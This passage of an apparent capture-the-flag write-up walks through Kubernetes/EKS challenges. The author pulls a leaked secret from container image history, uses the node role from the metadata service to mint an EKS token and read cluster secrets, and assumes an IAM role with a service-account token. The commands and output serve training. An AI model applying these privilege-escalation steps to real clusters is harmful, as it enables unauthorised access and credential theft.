class=\"hljs-comment\"\u003e# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01|jq\u003c/span\u003e\n{\n  \u003cspan class=\"hljs-string\"\u003e\"architecture\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"amd64\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"config\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"Env\"\u003c/span\u003e: [\n      \u003cspan class=\"hljs-string\"\u003e\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\u003c/span\u003e\n    ],\n    \u003cspan class=\"hljs-string\"\u003e\"Cmd\"\u003c/span\u003e: [\n      \u003cspan class=\"hljs-string\"\u003e\"/bin/sleep\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"3133337\"\u003c/span\u003e\n    ],\n    \u003cspan class=\"hljs-string\"\u003e\"ArgsEscaped\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"OnBuild\"\u003c/span\u003e: null\n  },\n  \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-01T13:32:07.782534085Z\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"history\"\u003c/span\u003e: [\n    {\n      \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-07-18T23:19:33.538571854Z\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"created_by\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / \"\u003c/span\u003e\n    },\n    {\n      \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-07-18T23:19:33.655005962Z\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"created_by\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"/bin/sh -c #(nop)  CMD [\\\"sh\\\"]\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"empty_layer\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    },\n    {\n      \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-01T13:32:07.782534085Z\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"created_by\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal\u0026#x3C;*REDACTED*\u003e} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"comment\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"buildkit.dockerfile.v0\"\u003c/span\u003e\n    },\n    {\n      \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-01T13:32:07.782534085Z\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"created_by\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"CMD [\\\"/bin/sleep\\\" \\\"3133337\\\"]\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"comment\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"buildkit.dockerfile.v0\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"empty_layer\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    }\n  ],\n  \u003cspan class=\"hljs-string\"\u003e\"os\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"linux\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"rootfs\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"type\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"layers\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"diff_ids\"\u003c/span\u003e: [\n      \u003cspan class=\"hljs-string\"\u003e\"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5\"\u003c/span\u003e\n    ]\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLooks like they made the same mistake again and leaked the secret in the image\nlayers!\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-markdown\"\u003ewiz\u003cspan class=\"hljs-emphasis\"\u003e_eks_\u003c/span\u003echallenge{the\u003cspan class=\"hljs-emphasis\"\u003e_history_\u003c/span\u003eof\u003cspan class=\"hljs-emphasis\"\u003e_container_\u003c/span\u003eimages\u003cspan class=\"hljs-emphasis\"\u003e_could_\u003c/span\u003ereveal\u0026#x3C;\u003cspan class=\"hljs-emphasis\"\u003e*REDACTED*\u003c/span\u003e\u003e} \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTime for challenge 4!\u003c/p\u003e\n\u003ch1\u003eChallenge 4\u003c/h1\u003e\n\u003cp\u003eThe hint:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eYo\u003cspan class=\"hljs-string\"\u003eu're inside a vulnerable pod on an EKS cluster. Your pod'\u003c/span\u003es service-account has\nno permissions. Can you navigate your way to access the EKS Node\u003cspan class=\"hljs-string\"\u003e's privileged\nservice-account?\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis sounds like we're going to need to escalate our privileges through the AWS\naccess we acquired in the last challenge. Lets start with inspecting the\nenvironment again:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get pod\u003c/span\u003e\nError from server (Forbidden): pods is forbidden: User \u003cspan class=\"hljs-string\"\u003e\"system:serviceaccount:challenge4:service-account-challenge4\"\u003c/span\u003e cannot list resource \u003cspan class=\"hljs-string\"\u003e\"pods\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e API group \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the namespace \u003cspan class=\"hljs-string\"\u003e\"challenge4\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo we don't even have access to list pods!   Do we have any access?\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl auth can-i --list\u003c/span\u003e\nwarning: the list may be incomplete: webhook authorizer does not support user rule resolution\nResources                                       Non-Resource URLs                     Resource Names     Verbs\nselfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]\n                                                [/.well-known/openid-configuration]   []                 [get]\n                                                [/api/*]                              []                 [get]\n                                                [/api]                                []                 [get]\n                                                [/apis/*]                             []                 [get]\n                                                [/apis]                               []                 [get]\n                                                [/healthz]                            []                 [get]\n                                                [/healthz]                            []                 [get]\n                                                [/livez]                              []                 [get]\n                                                [/livez]                              []                 [get]\n                                                [/openapi/*]                          []                 [get]\n                                                [/openapi]                            []                 [get]\n                                                [/openid/v1/jwks]                     []                 [get]\n                                                [/readyz]                             []                 [get]\n                                                [/readyz]                             []                 [get]\n                                                [/version/]                           []                 [get]\n                                                [/version/]                           []                 [get]\n                                                [/version]                            []                 [get]\n                                                [/version]                            []                 [get]\npodsecuritypolicies.policy                      []                                    [eks.privileged]   [use]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThat is \u003cem\u003every\u003c/em\u003e minimal access. So we are going to have to try get a token using\nthe escalated privileges.  Usually we could use \u003ccode\u003eaws eks get-token\u003c/code\u003e but that\nrequires knowing the cluster name and I don't know that.   Lets try to list the\nclusters:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws eks list-clusters\u003c/span\u003e\n\nAn error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo they haven't given us much to go on at all here.  The role itself \u003cem\u003emight\u003c/em\u003e be\na clue but that is relying on them being consistent with their naming:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-ruby\"\u003e\u003cspan class=\"hljs-symbol\"\u003earn:\u003c/span\u003e\u003cspan class=\"hljs-symbol\"\u003eaws:\u003c/span\u003ests::\u003cspan class=\"hljs-number\"\u003e688655246681\u003c/span\u003e\u003cspan class=\"hljs-symbol\"\u003e:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe cluster name \u003cem\u003emight\u003c/em\u003e be \u003ccode\u003eeks-challenge-cluster\u003c/code\u003e based on that but I can't\nguarantee that. Lets check its security groups:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# curl -sS http://169.254.169.254/latest/meta-data/security-groups;echo\u003c/span\u003e\neks-cluster-sg-eks-challenge-cluster-963543728\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe name is there again.  I don't feel good about not having more details but it\nis at least worth trying it:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws eks get-token --cluster-name eks-challenge-cluster\u003c/span\u003e\n{\n    \u003cspan class=\"hljs-string\"\u003e\"kind\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ExecCredential\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"apiVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"client.authentication.k8s.io/v1beta1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"spec\"\u003c/span\u003e: {},\n    \u003cspan class=\"hljs-string\"\u003e\"status\"\u003c/span\u003e: {\n        \u003cspan class=\"hljs-string\"\u003e\"expirationTimestamp\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-03T03:38:10Z\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"token\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYX\u0026#x3C;*REDACTED*\"\u003c/span\u003e\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis gets us a token, so lets try to use it:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# export TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster|jq '.status.token' -r)\u003c/span\u003e\nroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl --token \"$TOKEN\" auth can-i --list\u003c/span\u003e\nwarning: the list may be incomplete: webhook authorizer does not support user rule resolution\nResources                                       Non-Resource URLs   Resource Names     Verbs\nserviceaccounts/token                           []                  [debug-sa]         [create]\nselfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]\npods                                            []                  []                 [get list]\nsecrets                                         []                  []                 [get list]\nserviceaccounts                                 []                  []                 [get list]\n                                                [/api/*]            []                 [get]\n                                                [/api]              []                 [get]\n                                                [/apis/*]           []                 [get]\n                                                [/apis]             []                 [get]\n                                                [/healthz]          []                 [get]\n                                                [/healthz]          []                 [get]\n                                                [/livez]            []                 [get]\n                                                [/livez]            []                 [get]\n                                                [/openapi/*]        []                 [get]\n                                                [/openapi]          []                 [get]\n                                                [/readyz]           []                 [get]\n                                                [/readyz]           []                 [get]\n                                                [/version/]         []                 [get]\n                                                [/version/]         []                 [get]\n                                                [/version]          []                 [get]\n                                                [/version]          []                 [get]\npodsecuritypolicies.policy                      []                  [eks.privileged]   [use]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePerfect!  We have more access which includes fetching secrets:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl --token \"$TOKEN\" get secret -o json\u003c/span\u003e\n{\n    \u003cspan class=\"hljs-string\"\u003e\"apiVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"v1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"items\"\u003c/span\u003e: [\n        {\n            \u003cspan class=\"hljs-string\"\u003e\"apiVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"v1\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"data\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"flag\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3\u0026#x3C;*REDACTED*\u003e=\"\u003c/span\u003e\n            },\n            \u003cspan class=\"hljs-string\"\u003e\"kind\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Secret\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"metadata\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"creationTimestamp\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-01T12:27:57Z\"\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"node-flag\"\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e\"namespace\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"challenge4\"\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e\"resourceVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"883574\"\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e\"uid\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"26461a29-ec72-40e1-adc7-99128ce664f7\"\u003c/span\u003e\n            },\n            \u003cspan class=\"hljs-string\"\u003e\"type\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Opaque\"\u003c/span\u003e\n        }\n    ],\n    \u003cspan class=\"hljs-string\"\u003e\"kind\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"List\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"metadata\"\u003c/span\u003e: {\n        \u003cspan class=\"hljs-string\"\u003e\"resourceVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo we just need to base64 decode that and we are on to the next challenge!\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl --token \"$TOKEN\" get secret -o json | jq '.items[0].data.flag' -r|base64 -d\u003c/span\u003e\nwiz_eks_challenge{only_a_real_pro_can_navigate_\u0026#x3C;*REDACTED*\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003eChallenge 5\u003c/h1\u003e\n\u003cp\u003eThe hint:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-vbnet\"\u003eYou\u003cspan class=\"hljs-comment\"\u003e've successfully transitioned from a limited Service Account to a Node\u003c/span\u003e\nService Account! Great job. Your \u003cspan class=\"hljs-keyword\"\u003enext\u003c/span\u003e challenge \u003cspan class=\"hljs-built_in\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eto\u003c/span\u003e move \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the EKS \u003cspan class=\"hljs-keyword\"\u003eto\u003c/span\u003e the\nAWS account.\n\nCan you acquire the AWS role \u003cspan class=\"hljs-keyword\"\u003eof\u003c/span\u003e the s3access-sa service account, \u003cspan class=\"hljs-built_in\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eget\u003c/span\u003e the flag?\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo lets start with checking what access we do have:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl whoami \u003c/span\u003e\nsystem:node:challenge:ip-192-168-21-50.us-west-1.compute.internal\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCan we list buckets?\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws s3 ls\u003c/span\u003e\n\nAn error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNope!  So we need to figure out how to become the \u003ccode\u003es3access-sa\u003c/code\u003e. What access do\nwe have?\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl auth can-i --list\u003c/span\u003e\nwarning: the list may be incomplete: webhook authorizer does not support user rule resolution\nResources                                       Non-Resource URLs   Resource Names     Verbs\nserviceaccounts/token                           []                  [debug-sa]         [create]\nselfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]\npods                                            []                  []                 [get list]\nsecrets                                         []                  []                 [get list]\nserviceaccounts                                 []                  []                 [get list]\n                                                [/api/*]            []                 [get]\n                                                [/api]              []                 [get]\n                                                [/apis/*]           []                 [get]\n                                                [/apis]             []                 [get]\n                                                [/healthz]          []                 [get]\n                                                [/healthz]          []                 [get]\n                                                [/livez]            []                 [get]\n                                                [/livez]            []                 [get]\n                                                [/openapi/*]        []                 [get]\n                                                [/openapi]          []                 [get]\n                                                [/readyz]           []                 [get]\n                                                [/readyz]           []                 [get]\n                                                [/version/]         []                 [get]\n                                                [/version/]         []                 [get]\n                                                [/version]          []                 [get]\n                                                [/version]          []                 [get]\npodsecuritypolicies.policy                      []                  [eks.privileged]   [use]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHmm, being able to create tokens for the \u003ccode\u003edebug-sa\u003c/code\u003e resource definitely seems\nsuspicious. So lets see if that will get us anywhere:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# export TOKEN=$(kubectl create token debug-sa)\u003c/span\u003e\nroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl --token $TOKEN auth can-i --list\u003c/span\u003e\nwarning: the list may be incomplete: webhook authorizer does not support user rule resolution\nResources                                       Non-Resource URLs                     Resource Names     Verbs\nselfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]\nselfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]\n                                                [/.well-known/openid-configuration]   []                 [get]\n                                                [/api/*]                              []                 [get]\n                                                [/api]                                []                 [get]\n                                                [/apis/*]                             []                 [get]\n                                                [/apis]                               []                 [get]\n                                                [/healthz]                            []                 [get]\n                                                [/healthz]                            []                 [get]\n                                                [/livez]                              []                 [get]\n                                                [/livez]                              []                 [get]\n                                                [/openapi/*]                          []                 [get]\n                                                [/openapi]                            []                 [get]\n                                                [/openid/v1/jwks]                     []                 [get]\n                                                [/readyz]                             []                 [get]\n                                                [/readyz]                             []                 [get]\n                                                [/version/]                           []                 [get]\n                                                [/version/]                           []                 [get]\n                                                [/version]                            []                 [get]\n                                                [/version]                            []                 [get]\npodsecuritypolicies.policy                      []                                    [eks.privileged]   [use]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLooks like we have less access than before.  So not too helpful, lets take a\nlook at that service account we want to become:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get sa s3access-sa -o json\u003c/span\u003e\n{\n    \u003cspan class=\"hljs-string\"\u003e\"apiVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"v1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"kind\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ServiceAccount\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"metadata\"\u003c/span\u003e: {\n        \u003cspan class=\"hljs-string\"\u003e\"annotations\"\u003c/span\u003e: {\n            \u003cspan class=\"hljs-string\"\u003e\"eks.amazonaws.com/role-arn\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"arn:aws:iam::688655246681:role/challengeEksS3Role\"\u003c/span\u003e\n        },\n        \u003cspan class=\"hljs-string\"\u003e\"creationTimestamp\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-10-31T20:07:34Z\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"s3access-sa\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"namespace\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"challenge5\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"resourceVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"671916\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"uid\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"86e44c49-b05a-4ebe-800b-45183a6ebbda\"\u003c/span\u003e\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eI think we are going to need to use our AWS access to assume that role, I don't\nbelieve our kubernetes access is going to get us anywhere:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test\u003c/span\u003e\n\nAn error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOk, so \u003cem\u003emaybe\u003c/em\u003e our kubernetes access is important since we can't assume the role\ndirectly.   Lets try to use that $TOKEN from \u003ccode\u003edebug-sa\u003c/code\u003e to assume the role:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN\u003c/span\u003e\n\nAn error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eGetting closer!   The default audience for a token created with \u003ccode\u003ekubectl\u003c/code\u003e is\n\u003ccode\u003ehttps://kubernetes.default.svc\u003c/code\u003e which amazon doesn't seem to like.  Lets try\ncreating it again with \u003ccode\u003ests.amazonaws.com\u003c/code\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)\nroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN\u003c/span\u003e\n{\n    \u003cspan class=\"hljs-string\"\u003e\"Credentials\"\u003c/span\u003e: {\n        \u003cspan class=\"hljs-string\"\u003e\"AccessKeyId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ASIA2AVYNEV\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"SecretAccessKey\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"VTZ4TuDrtHGca\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"SessionToken\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"Expiration\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-03T05:09:07+00:00\"\u003c/span\u003e\n    },\n    \u003cspan class=\"hljs-string\"\u003e\"SubjectFromWebIdentityToken\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"system:serviceaccount:challenge5:debug-sa\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"AssumedRoleUser\"\u003c/span\u003e: {\n        \u003cspan class=\"hljs-string\"\u003e\"AssumedRoleId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"AROA2AVYNEVMZEZ2AFVYI:test\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"Arn\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test\"\u003c/span\u003e\n    },\n    \u003cspan class=\"hljs-string\"\u003e\"Provider\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"Audience\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"sts.amazonaws.com\"\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSuccess!  We have some new AWS credentials.  Lets setup our new AWS Session:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e AWS_ACCESS_KEY_ID=\u003cspan class=\"hljs-string\"\u003e\"ASIA2AVYNEV\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e AWS_SECRET_ACCESS_KEY=\u003cspan class=\"hljs-string\"\u003e\"VTZ4TuDrtHGca\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e AWS_SESSION_TOKEN=\u003cspan class=\"hljs-string\"\u003e\"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\n\nroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws sts get-caller-identity\u003c/span\u003e\n{\n    \u003cspan class=\"hljs-string\"\u003e\"UserId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"AROA2AVYNEVMZEZ2AFVYI:test\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"Account\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"688655246681\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"Arn\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test\"\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe are now the new role!   We hopefully have access to S3 now.  At the start\nof the challenge it provided us a clue to what bucket we want to view by\nproviding us the IAM policy:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-json\"\u003e\u003cspan 